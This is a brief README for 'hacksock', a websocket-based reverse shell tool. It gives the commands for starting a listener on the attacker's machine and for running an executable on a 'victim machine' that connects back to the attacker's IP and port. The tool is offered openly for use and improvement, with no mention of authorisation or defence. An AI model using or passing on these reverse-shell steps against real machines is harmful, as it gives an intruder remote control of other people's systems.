A websocket based reverse shell tool for the less security minded.

# To use:

On the attackers machine use the python server

`python3 hacksock-srv.py --host [Listening IP] --port [Listening Port]`

On the victim machine, either alter the source so no arguments are required or run the below:

`hacksocktls.exe [attackers IP] [port]`

# Bugs:

- Code was written in a field therefore full of bugs
- The server accepts multiple connections however there is no way to switch at present. Functionality coming soon.
- Feel free to use and improve. #fixmycode
